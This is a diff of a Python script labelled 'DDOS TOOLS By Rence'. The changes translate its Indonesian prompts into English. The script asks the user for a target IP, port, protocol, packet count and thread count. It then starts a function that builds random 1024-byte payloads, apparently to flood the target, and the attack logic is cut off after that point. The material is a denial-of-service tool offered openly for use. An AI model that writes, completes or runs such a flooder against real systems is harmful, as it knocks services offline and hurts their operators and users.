@@ -6,14 +6,14 @@ import threading
 
 print("~~~ DDOS TOOLS By Rence ~~~")
 print("~~~ Code and Scripted by Rence ~~~")
-print("~~~ Script ini dibuat hanya untuk rence Pribadi. ~~~")
+print("~~~ This script is made for personal use only. ~~~")
 print("~~~ Don't Forget to subscribe Ren Samp ~~~")
 print("~~~ DDOS by rence dibuat hanya untuk kontent. ~~~")
 ip = str(input(" Target Ip:"))
 port = int(input(" Target Port:"))
 choice = str(input(" UDP(y/n):"))
-times = int(input(" Paket yang dikirim ke target:"))
-threads = int(input(" Threads yang dikirim:"))
+times = int(input(" Packages sent to target:"))
+threads = int(input(" Threads engaged:"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
